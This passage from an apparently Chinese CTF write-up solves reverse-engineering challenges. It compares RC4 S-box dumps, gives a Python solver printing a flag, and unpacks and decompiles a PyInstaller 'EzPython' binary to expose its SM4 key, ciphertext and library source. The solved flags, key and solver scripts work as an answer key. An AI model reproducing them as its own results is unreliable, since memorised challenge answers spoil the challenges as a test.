然后与flag2比较box&#x3D;358E0B78B4F6319CD92CC1FCE2D81D8D4F978126C0B89627D55BAA1885FA61E4A1BCF8A4563743582BC97764CC6B986575388009113DD0E68FA9579906105DC569BD2D687EE367D1FF5EF9F5418CDD214BA747866DC32A9A9F2048BB94B97A9202747D1B1E5FBA49D6E75304CB283FE8333E009B6AFDBE1C90EDDF4D256FB513703C9E160C054A73DEB18A513B5414E05ADC9162A395D33A17EE32F27CAFB388EC0EAE9D5C0D554EFB46224445BF52126607D236936E421A0FE960CAB26C83F00376A81F63EFA5CD797B0ADAABDBD47F01342359E129C6ACA240C8ADC489C2B671A0EB2F19F3B0FECEF78472F4CFC7D7B7F14C8230502E24870839E5EAA68B15box2&#x3D;35F1DA197AF6319CD92CC1FCE2D81D8D4F978126C0B89627D55BAA1885FA61E4A1BCF8A4563743582BC97764CC6B986575388009113DD0E68FA9579906105DC569BD2D687EE367D1FF5EF9F5418CDD214BA747866DC32A9A9F2048BB94B9B49202747D1B1E5FBA49D6E75304CB283FE8333E009B6AFDBE1C90EDDF4D256FB513703C9E160C054A73DEB18A513B5414E05ADC9162A395D33A17EE32F27CAFB388EC0EAE9D5C0D554EFB46224445BF52126607D236936E421A0FE960CAB26C83F00376A81F63EFA5CD797B0A0BABDBD47F01342359E129C6ACA240C8ADC489C2B671A0EB2F78F3B0FECEF78472F4CFC7D7B78E4C8230502E24870839E5EAA68B15两个box的值都是一样的，rc4如加，直接逆前面那段逻辑就行了，<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>50751</p><p>这个就是给box的函数，懒得逆了，rnm写到这发现没提str1[]的值，又坐一遍牢</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e>&#123;'</span>Str1<span class="token operator">=</span><span class="token string">'5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n\x8e'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#flag&#123;Russian_is_so_easy&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezpython"><a class="markdownIt-Anchor" href="#ezpython"></a> <strong>EzPython</strong></h2><p>首先利用pyinstxtractor工具拆包得到ezpython.exe_extracted</p><p>在里面找到ezpython.pyc文件，使用uncompyle6 反编译出源码</p><p>这里有个坑，如果python版本不对，作者自己写的东西是提不出来的，用conda下个3.8提取作者写的东西</p><p>如果用其他版本的py提会导致ezpython.exe_extracted\PYZ-00.pyz_extracted是空的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>python37<span class="token punctuation">)</span> PS C<span class="token punctuation">:</span>\Users\Npc\<span class="token punctuation">.</span>conda\envs\python37\Scripts<span class="token operator">></span> <span class="token punctuation">.</span>\uncompyle6<span class="token punctuation">.</span>exe <span class="token punctuation">.</span>\ezpython<span class="token punctuation">.</span>pyc<span class="token comment"># uncompyle6 version 3.9.0</span><span class="token comment"># Python bytecode version base 3.8.0 (3413)</span><span class="token comment"># Decompiled from: Python 3.7.12 | packaged by conda-forge | (default, Oct 26 2021, 05:35:01) [MSC v.1916 64 bit (AMD64)]</span><span class="token comment"># Embedded file name: ezpython.py</span><span class="token keyword">from</span> gmssl <span class="token keyword">import</span> sm4<span class="token keyword">from</span> secret <span class="token keyword">import</span> key<span class="token punctuation">,</span> enc<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">pad_pkcs7</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""PKCS#7填充"""</span>    padding_len <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span>    padding <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>padding_len<span class="token punctuation">]</span> <span class="token operator">*</span> padding_len<span class="token punctuation">)</span>    <span class="token keyword">return</span> data <span class="token operator">+</span> padding<span class="token keyword">def</span> <span class="token function">unpad_pkcs7</span><span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""PKCS#7去填充"""</span>    padding_len <span class="token operator">=</span> padded_data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> padded_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>padding_len<span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">SM4</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>gmsm4 <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">encryptSM4</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> encrypt_key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        gmsm4 <span class="token operator">=</span> self<span class="token punctuation">.</span>gmsm4        gmsm4<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>encrypt_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_ENCRYPT<span class="token punctuation">)</span>        padded_value <span class="token operator">=</span> pad_pkcs7<span class="token punctuation">(</span>value<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        encrypt_value <span class="token operator">=</span> gmsm4<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>padded_value<span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypt_value<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请输入你的flag:'</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    sm4_instance <span class="token operator">=</span> SM4<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_1 <span class="token operator">=</span> sm4_instance<span class="token punctuation">.</span>encryptSM4<span class="token punctuation">(</span>key<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag_1 <span class="token operator">!=</span> enc<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag错误!!'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'恭喜你获得flag😊😀'</span><span class="token punctuation">)</span><span class="token comment"># okay decompiling .\ezpython.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>uncompyle secret库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Embedded file name: secret.py</span>key <span class="token operator">=</span> <span class="token string">'BeginCTFBeginCTF'</span>enc <span class="token operator">=</span> <span class="token string">b'JmjJEAJGMT6F9bmC+Vyxy8Z1lpfaJzdEX6BGG/qgqUjUpQaYSON1CnZyX9YXTEClSRYm7PFZtGxmJw6LPuw1ww=='</span><span class="token comment"># okay decompiling C:\Users\Npc\Desktop\CTF\beginCTF\beginctfRE\ezpython\ezpython.exe_extracted\PYZ-00.pyz_extracted\secret.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>加密逻辑实际上是对flag进行一次SM4加密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Embedded file name: gmssl\sm4.py</span><span class="token keyword">import</span> copy<span class="token keyword">from</span> <span class="token punctuation">.</span>func <span class="token keyword">import</span> xor<span class="token punctuation">,</span> rotl<span class="token punctuation">,</span> get_uint32_be<span class="token punctuation">,</span> put_uint32_be<span class="token punctuation">,</span> bytes_to_list<span class="token punctuation">,</span> list_to_bytes<span class="token punctuation">,</span> pkcs7_padding<span class="token punctuation">,</span> pkcs7_unpadding<span class="token punctuation">,</span> zero_padding<span class="token punctuation">,</span> zero_unpaddingSM4_BOXES_TABLE <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token number">214</span><span class="token punctuation">,</span>  <span class="token number">144</span><span class="token punctuation">,</span>  <span class="token number">233</span><span class="token punctuation">,</span>  <span class="token number">254</span><span class="token punctuation">,</span>  <span class="token number">204</span><span class="token punctuation">,</span>  <span class="token number">225</span><span class="token punctuation">,</span>  <span class="token number">61</span><span class="token punctuation">,</span>  <span class="token number">183</span><span class="token punctuation">,</span>  <span class="token number">22</span><span class="token punctuation">,</span>  <span class="token number">182</span><span class="token punctuation">,</span>  <span class="token number">20</span><span class="token punctuation">,</span>  <span class="token number">194</span><span class="token punctuation">,</span>  <span class="token number">40</span><span class="token punctuation">,</span>  <span class="token number">251</span><span class="token punctuation">,</span>  <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">43</span><span class="token punctuation">,</span>  <span class="token number">103</span><span class="token punctuation">,</span>  <span class="token number">154</span><span class="token punctuation">,</span>  <span class="token number">118</span><span class="token punctuation">,</span>  <span class="token number">42</span><span class="token punctuation">,</span>  <span class="token number">190</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">195</span><span class="token punctuation">,</span>  <span class="token number">170</span><span class="token punctuation">,</span>  <span class="token number">68</span><span class="token punctuation">,</span>  <span class="token number">19</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token number">73</span><span class="token punctuation">,</span>  <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">153</span><span class="token punctuation">,</span>  <span class="token number">156</span><span class="token punctuation">,</span>  <span class="token number">66</span><span class="token punctuation">,</span>  <span class="token number">80</span><span class="token punctuation">,</span>  <span class="token number">244</span><span class="token punctuation">,</span>  <span class="token number">145</span><span class="token punctuation">,</span>  <span class="token number">239</span><span class="token punctuation">,</span>  <span class="token number">152</span><span class="token punctuation">,</span>  <span class="token number">122</span><span class="token punctuation">,</span>  <span class="token number">51</span><span class="token punctuation">,</span>  <span class="token number">84</span><span class="token punctuation">,</span>  <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">67</span><span class="token punctuation">,</span>  <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span>  <span class="token number">172</span><span class="token punctuation">,</span>  <span class="token number">98</span><span class="token punctuation">,</span>  <span class="token number">228</span><span class="token punctuation">,</span>  <span class="token number">179</span><span class="token punctuation">,</span>  <span class="token number">28</span><span class="token punctuation">,</span>  <span class="token number">169</span><span class="token punctuation">,</span>  <span class="token number">201</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">232</span><span class="token punctuation">,</span>  <span class="token number">149</span><span class="token punctuation">,</span>  <span class="token number">128</span><span class="token punctuation">,</span>  <span class="token number">223</span><span class="token punctuation">,</span>  <span class="token number">148</span><span class="token punctuation">,</span>  <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span>  <span class="token number">143</span><span class="token punctuation">,</span>  <span class="token number">63</span><span class="token punctuation">,</span>  <span class="token number">166</span><span class="token punctuation">,</span>  <span class="token number">71</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">167</span><span class="token punctuation">,</span>  <span class="token number">252</span><span class="token punctuation">,</span>  <span class="token number">243</span><span class="token punctuation">,</span>  <span class="token number">115</span><span class="token punctuation">,</span>  <span class="token number">23</span><span class="token punctuation">,</span>  <span class="token number">186</span><span class="token punctuation">,</span>  <span class="token number">131</span><span class="token punctuation">,</span>  <span class="token number">89</span><span class="token punctuation">,</span>  <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span>  <span class="token number">230</span><span class="token punctuation">,</span>  <span class="token number">133</span><span class="token punctuation">,</span>  <span class="token number">79</span><span class="token punctuation">,</span>  <span class="token number">168</span><span class="token punctuation">,</span>  <span class="token number">104</span><span class="token punctuation">,</span>  <span class="token number">107</span><span class="token punctuation">,</span>  <span class="token number">129</span><span class="token punctuation">,</span>  <span class="token number">178</span><span class="token punctuation">,</span>  <span class="token number">113</span><span class="token punctuation">,</span>  <span class="token number">100</span><span class="token punctuation">,</span>  <span class="token number">218</span><span class="token punctuation">,</span>  <span class="token number">139</span><span class="token punctuation">,</span>  <span class="token number">248</span><span class="token punctuation">,</span>  <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">75</span><span class="token punctuation">,</span>  <span class="token number">112</span><span class="token punctuation">,</span>  <span class="token number">86</span><span class="token punctuation">,</span>  <span class="token number">157</span><span class="token punctuation">,</span>  <span class="token number">53</span><span class="token punctuation">,</span>  <span class="token number">30</span><span class="token punctuation">,</span>  <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">94</span><span class="token punctuation">,</span>  <span class="token number">99</span><span class="token punctuation">,</span>  <span class="token number">88</span><span class="token punctuation">,</span>  <span class="token number">209</span><span class="token punctuation">,</span>  <span class="token number">162</span><span class="token punctuation">,</span>  <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span>  <span class="token number">124</span><span class="token punctuation">,</span>  <span class="token number">59</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span>  <span class="token number">120</span><span class="token punctuation">,</span>  <span class="token number">135</span><span class="token punctuation">,</span>  <span class="token number">212</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">70</span><span class="token punctuation">,</span>  <span class="token number">87</span><span class="token punctuation">,</span>  <span class="token number">159</span><span class="token punctuation">,</span>  <span class="token number">211</span><span class="token punctuation">,</span>  <span class="token number">39</span><span class="token punctuation">,</span>  <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span>  <span class="token number">54</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">231</span><span class="token punctuation">,</span>  <span class="token number">160</span><span class="token punctuation">,</span>  <span class="token number">196</span><span class="token punctuation">,</span>  <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token number">158</span><span class="token punctuation">,</span>  <span class="token number">234</span><span class="token punctuation">,</span>  <span class="token number">191</span><span class="token punctuation">,</span>  <span class="token number">138</span><span class="token punctuation">,</span>  <span class="token number">210</span><span class="token punctuation">,</span>  <span class="token number">64</span><span class="token punctuation">,</span>  <span class="token number">199</span><span class="token punctuation">,</span>  <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span>  <span class="token number">163</span><span class="token punctuation">,</span>  <span class="token number">247</span><span class="token punctuation">,</span>  <span class="token number">242</span><span class="token punctuation">,</span>  <span class="token number">206</span><span class="token punctuation">,</span>  <span class="token number">249</span><span class="token punctuation">,</span>  <span class="token number">97</span><span class="token punctuation">,</span>  <span class="token number">21</span><span class="token punctuation">,</span>  <span class="token number">161</span><span class="token punctuation">,</span>  <span class="token number">224</span><span class="token punctuation">,</span>  <span class="token number">174</span><span class="token punctuation">,</span>  <span class="token number">93</span><span class="token punctuation">,</span>  <span class="token number">164</span><span class="token punctuation">,</span>  <span class="token number">155</span><span class="token punctuation">,</span>  <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span>  <span class="token number">85</span><span class="token punctuation">,</span>  <span class="token number">173</span><span class="token punctuation">,</span>  <span class="token number">147</span><span class="token punctuation">,</span>  <span class="token number">50</span><span class="token punctuation">,</span>  <span class="token number">48</span><span class="token punctuation">,</span>  <span class="token number">245</span><span class="token punctuation">,</span>  <span class="token number">140</span><span class="token punctuation">,</span>  <span class="token number">177</span><span class="token punctuation">,</span>  <span class="token number">227</span><span class="token punctuation">,</span>  <span class="token number">29</span><span class="token punctuation">,</span>  <span class="token number">246</span><span class="token punctuation">,</span>  <span class="token number">226</span><span class="token punctuation">,</span>  <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span>  <span class="token number">202</span><span class="token punctuation">,</span>  <span class="token number">96</span><span class="token punctuation">,</span>  <span class="token number">192</span><span class="token punctuation">,</span>  <span class="token number">41</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span>  <span class="token number">171</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">83</span><span class="token punctuation">,</span>  <span class="token number">78</span><span class="token punctuation">,</span>  <span class="token number">111</span><span class="token punctuation">,</span>  <span class="token number">213</span><span class="token punctuation">,</span>  <span class="token number">219</span><span class="token punctuation">,</span>  <span class="token number">55</span><span class="token punctuation">,</span>  <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span>  <span class="token number">253</span><span class="token punctuation">,</span>  <span class="token number">142</span><span class="token punctuation">,</span>  <span class="token number">47</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">255</span><span class="token punctuation">,</span>  <span class="token number">106</span><span class="token punctuation">,</span>  <span class="token number">114</span><span class="token punctuation">,</span>  <span class="token number">109</span><span class="token punctuation">,</span>  <span class="token number">108</span><span class="token punctuation">,</span>  <span class="token number">91</span><span class="token punctuation">,</span>  <span class="token number">81</span><span class="token punctuation">,</span>  <span class="token number">141</span><span class="token punctuation">,</span>  <span class="token number">27</span><span class="token punctuation">,</span>  <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span>  <span class="token number">187</span><span class="token punctuation">,</span>  <span class="token number">221</span><span class="token punctuation">,</span>  <span class="token number">188</span><span class="token punctuation">,</span>  <span class="token number">127</span><span class="token punctuation">,</span>  <span class="token number">17</span><span class="token punctuation">,</span>  <span class="token number">217</span><span class="token punctuation">,</span>  <span class="token number">92</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span>  <span class="token number">31</span><span class="token punctuation">,</span>  <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">90</span><span class="token punctuation">,</span>  <span class="token number">216</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span>  <span class="token number">136</span><span class="token punctuation">,</span>  <span class="token number">165</span><span class="token punctuation">,</span>  <span class="token number">205</span><span class="token punctuation">,</span>  <span class="token number">123</span><span class="token punctuation">,</span>  <span class="token number">189</span><span class="token punctuation">,</span>  <span class="token number">45</span><span class="token punctuation">,</span>  <span class="token number">116</span><span class="token punctuation">,</span>  <span class="token number">208</span><span class="token punctuation">,</span>  <span class="token number">18</span><span class="token punctuation">,</span>  <span class="token number">184</span><span class="token punctuation">,</span>  <span class="token number">229</span><span class="token punctuation">,</span>  <span class="token number">180</span><span class="token punctuation">,</span>  <span class="token number">176</span><span class="token punctuation">,</span>  <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span>  <span class="token number">151</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span>  <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">150</span><span class="token punctuation">,</span>  <span class="token number">119</span><span class="token punctuation">,</span>  <span class="token number">126</span><span class="token punctuation">,</span>  <span class="token number">101</span><span class="token punctuation">,</span>  <span class="token number">185</span><span class="token punctuation">,</span>  <span class="token number">241</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">197</span><span class="token punctuation">,</span>  <span class="token number">110</span><span class="token punctuation">,</span>  <span class="token number">198</span><span class="token punctuation">,</span>  <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span>  <span class="token number">240</span><span class="token punctuation">,</span>  <span class="token number">125</span><span class="token punctuation">,</span>  <span class="token number">236</span><span class="token punctuation">,</span>  <span class="token number">58</span><span class="token punctuation">,</span>  <span class="token number">220</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span>  <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">121</span><span class="token punctuation">,</span>  <span class="token number">238</span><span class="token punctuation">,</span>  <span class="token number">95</span><span class="token punctuation">,</span>  <span class="token number">62</span><span class="token punctuation">,</span>  <span class="token number">215</span><span class="token punctuation">,</span>  <span class="token number">203</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span>SM4_FK <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token number">2746333894</span><span class="token punctuation">,</span> <span class="token number">1453994832</span><span class="token punctuation">,</span> <span class="token number">1736282519</span><span class="token punctuation">,</span> <span class="token number">2993693404</span><span class="token punctuation">]</span>SM4_CK <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token number">462357</span><span class="token punctuation">,</span>  <span class="token number">472066609</span><span class="token punctuation">,</span>  <span class="token number">943670861</span><span class="token punctuation">,</span>  <span class="token number">1415275113</span><span class="token punctuation">,</span> <span class="token number">1886879365</span><span class="token punctuation">,</span>  <span class="token number">2358483617</span><span class="token punctuation">,</span>  <span class="token number">2830087869</span><span class="token punctuation">,</span>  <span class="token number">3301692121</span><span class="token punctuation">,</span> <span class="token number">3773296373</span><span class="token punctuation">,</span>  <span class="token number">4228057617</span><span class="token punctuation">,</span>  <span class="token number">404694573</span><span class="token punctuation">,</span>  <span class="token number">876298825</span><span class="token punctuation">,</span> <span class="token number">1347903077</span><span class="token punctuation">,</span>  <span class="token number">1819507329</span><span class="token punctuation">,</span>  <span class="token number">2291111581</span><span class="token punctuation">,</span>  <span class="token number">2762715833</span><span class="token punctuation">,</span> <span class="token number">3234320085</span><span class="token punctuation">,</span>  <span class="token number">3705924337</span><span class="token punctuation">,</span>  <span class="token number">4177462797</span><span class="token punctuation">,</span>  <span class="token number">337322537</span><span class="token punctuation">,</span> <span class="token number">808926789</span><span class="token punctuation">,</span>  <span class="token number">1280531041</span><span class="token punctuation">,</span>  <span class="token number">1752135293</span><span class="token punctuation">,</span>  <span class="token number">2223739545</span><span class="token punctuation">,</span> <span class="token number">2695343797</span><span class="token punctuation">,</span>  <span class="token number">3166948049</span><span class="token punctuation">,</span>  <span class="token number">3638552301</span><span class="token punctuation">,</span>  <span class="token number">4110090761</span><span class="token punctuation">,</span> <span class="token number">269950501</span><span class="token punctuation">,</span>  <span class="token number">741554753</span><span class="token punctuation">,</span>  <span class="token number">1213159005</span><span class="token punctuation">,</span>  <span class="token number">1684763257</span><span class="token punctuation">]</span>SM4_ENCRYPT <span class="token operator">=</span> <span class="token number">0</span>SM4_DECRYPT <span class="token operator">=</span> <span class="token number">1</span>PKCS7 <span class="token operator">=</span> <span class="token number">0</span>ZERO <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">class</span> <span class="token class-name">CryptSM4</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> mode<span class="token operator">=</span>SM4_ENCRYPT<span class="token punctuation">,</span> padding_mode<span class="token operator">=</span>PKCS7<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>sk <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">32</span>        self<span class="token punctuation">.</span>mode <span class="token operator">=</span> mode        self<span class="token punctuation">.</span>padding_mode <span class="token operator">=</span> padding_mode    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">_round_key</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> ka<span class="token punctuation">)</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>        a <span class="token operator">=</span> put_uint32_be<span class="token punctuation">(</span>ka<span class="token punctuation">)</span>        b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        bb <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        rk <span class="token operator">=</span> bb <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">^</span> rotl<span class="token punctuation">(</span>bb<span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> rk    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">_f</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> x0<span class="token punctuation">,</span> x1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> x3<span class="token punctuation">,</span> rk<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">_sm4_l_t</span><span class="token punctuation">(</span>ka<span class="token punctuation">)</span><span class="token punctuation">:</span>            b <span class="token operator">=</span> <span class="token punctuation">[</span>             <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>            a <span class="token operator">=</span> put_uint32_be<span class="token punctuation">(</span>ka<span class="token punctuation">)</span>            b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> SM4_BOXES_TABLE<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span 